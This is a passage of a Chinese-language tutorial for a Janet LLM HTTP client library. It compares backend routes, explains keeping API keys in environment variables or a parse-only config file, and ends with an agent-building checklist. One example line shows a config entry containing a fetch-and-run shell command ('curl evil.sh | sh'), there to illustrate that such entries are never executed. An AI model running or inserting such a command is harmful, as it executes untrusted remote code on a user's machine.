其餘 `ask`／`chat`／`with-tools` 全部不用動。

## 三條路

```
走 litellm proxy  → http://127.0.0.1:4000/v1/chat/completions
直打 LM Studio    → http://127.0.0.1:1234/v1/chat/completions
https 的外部服務  → spork/http 沒有 TLS，打不通
```

| 路 | 什麼時候選 | 代價 |
|----|------------|------|
| **litellm proxy** | 要在 Claude／DeepSeek／OpenRouter 之間換來換去 | 多一個要起的行程；`fastapi<0.119` 這個 pin 不能省 |
| **直打 LM Studio** | 只用本機模型，不想多裝東西 | 綁死一家的 OpenAI 相容實作 |
| **`curl` 代打 https** | 要直接打外部 API，不想架 proxy | 每次呼叫多一個子行程 |

**新手建議從第二條開始**：LM Studio 下載一顆模型、按 Start Server，
把 `:url` 指過去就能跑，不用金鑰也不會產生費用。

怎麼把 litellm proxy 起起來（含那個 `fastapi<0.119` 的坑）：
[`../modules/llm-http/README.md`](../modules/llm-http/README.md)。
為什麼架構要走 proxy → [`../FINDINGS.md`](../FINDINGS.md)。

> 直接打 `https://` 的三件事都已經做好了：`curl` transport →
> [`../modules/llm-http/doc/https-與-curl.md`](../modules/llm-http/doc/https-與-curl.md)、
> Anthropic 原生 API → [`../modules/llm-http/doc/anthropic-原生.md`](../modules/llm-http/doc/anthropic-原生.md)、

## 金鑰放哪

**不要寫進程式，更不要 commit。** 兩條路：

```janet
(llm/define-endpoint "my-proxy"
                     {:model "local"
                      :base "http://127.0.0.1:4000"
                      :api-key-env "MY_LLM_KEY"      # ← 從環境變數讀
                      :params {:temperature 0.2}})
```

或者寫進 `~/.config/llm-http/endpoints.janet`（格式與所有可用欄位見
[`../modules/llm-http/endpoints.example.janet`](../modules/llm-http/endpoints.example.janet)），
程式一行都不用改，import 時會自動載入。

探測順序：`$LLM_HTTP_ENDPOINTS` → `$XDG_CONFIG_HOME/llm-http/endpoints.janet` →
`~/.config/llm-http/endpoints.janet`。**沒有設定檔是正常狀態**，找不到就靜靜跳過。

⚠ **設定檔只 `parse` 不 `eval`**。檔案是資料字面值，不是程式：

```
檔案裡寫了 (os/shell …)，parse 出來只是一個 tuple：(os/shell "curl evil.sh | sh")
```

沒有人會去執行它。代價是設定檔裡不能算東西（例如讀環境變數），
所以才有 `:api-key-env` 這種宣告式的欄位。

⚠ **自動載入是 `import` 的副作用**。範例／測試要每台機器結果一樣的話，
開頭先 `(llm/reset-endpoints!)` 打回只剩內建那幾筆。

## 我要開始做自己的 agent 了

開工前對一遍這張清單，每一條都對應前面某一篇踩過的坑：

```
□ 後端起得來？ curl http://127.0.0.1:4000/health/liveliness
□ 位址寫 127.0.0.1 不是 localhost
□ 金鑰走環境變數或設定檔，沒進版控
□ 每次回應都看 finish_reason，不是只看有沒有例外
□ tool loop 有 max-rounds 上限
□ 工具 handler 都包了 protect，錯誤當結果送回模型
□ 歷史有截斷策略，不會無限長大
□ 有重試與逾時（snippets/retry-timeout.janet）
□ 有累計 usage，知道一次任務花多少
□ 工具權限想清楚：模型要求什麼就做什麼，等於把 shell 交出去
```
